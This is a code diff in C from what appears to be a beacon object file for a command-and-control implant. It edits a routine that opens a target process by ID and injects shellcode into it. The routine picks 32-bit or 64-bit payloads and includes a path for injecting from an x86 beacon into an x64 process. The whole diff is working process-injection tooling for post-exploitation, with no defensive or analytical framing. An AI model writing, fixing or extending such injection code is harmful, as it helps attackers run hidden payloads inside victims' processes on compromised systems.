@@ -43,9 +43,6 @@ BOOL IsProcessWow64( _In_ PVOID Process )
 				/* Status */
 				Ret = TRUE;
 			};
-		} else {
-			/* Status */
-			Ret = TRUE;
 		};
 
 		/* Dereference */
@@ -113,32 +110,33 @@ VOID InjectExplicitGo( _In_ PVOID Argv, _In_ INT Argc, _In_ BOOLEAN x64 )
 		if ( NT_SUCCESS( Api.NtOpenProcess( &Prc, PROCESS_QUERY_INFORMATION, &Att, &Cid ) ) ) {
 			do 
 			{
-				if ( IsProcessWow64( Prc ) == TRUE && x64 != FALSE ) {
-					BeaconPrintf( CALLBACK_ERROR, "Beacon cannot inject x64 content into a x86 process from an x64 beacon." );
+			#if defined( _WIN64 )
+				if ( IsProcessWow64( Prc ) != FALSE ) {
+					BeaconPrintf( CALLBACK_ERROR, "Beacon cannot inject x86 process from an x64 beacon." );
 					break;
 				};
-				if ( IsProcessWow64( Prc ) == FALSE && x64 != TRUE ) {
-					BeaconPrintf( CALLBACK_ERROR, "Beacon cannot inject x86 content into a x64 process from an x86 beacon." );
+			#else
+				if ( IsProcessWow64( Prc ) != FALSE && x64 != FALSE ) {
+					BeaconPrintf( CALLBACK_ERROR, "Beacon cannot inject x64 content into an x86 process." );
 					break;
 				};
-
-				if ( IsProcessWow64( Prc ) == TRUE && IsProcessWow64( NtCurrentProcess() ) == FALSE ) {
-					BeaconPrintf( CALLBACK_ERROR, "Beacon cannot inject x86 process from x64 beacon." );
+			#endif
+				if ( IsProcessWow64( Prc ) != TRUE && x64 != TRUE ) {
+					BeaconPrintf( CALLBACK_ERROR, "Beacon cannot inject x86 content into an x64 process." );
 					break;
 				};
-				if ( IsProcessWow64( Prc ) != TRUE && IsProcessWow64( NtCurrentProcess() ) != FALSE ) 
-				{
-					#if ! defined( _WIN64 )
+			#if defined( _WIN64 )
+				/* x64 -> x64 */
+				EnterShellcode( Payload64, Pid, Ofs, Buf, Len );
+			#else
+				if ( IsProcessWow64( Prc ) != FALSE ) {
+					/* x86 -> x86 */
+					EnterShellcode( Payload32, Pid, Ofs, Buf, Len );
+				} else {
+					/* x86 -> x64 */
 					EnterShellcode64( Payload64, Pid, Ofs, Buf, Len, 0, NULL, &Ret );
-					#endif
-				} else 
-				{
-					#if ! defined( _WIN64 )
-					Ret = EnterShellcode( Payload32, Pid, Ofs, Buf, Len );
-					#else
-					Ret = EnterShellcode( Payload64, Pid, Ofs, Buf, Len );
-					#endif
 				};
+			#endif
 			} while ( 0 );
 
 			/* Close the process */
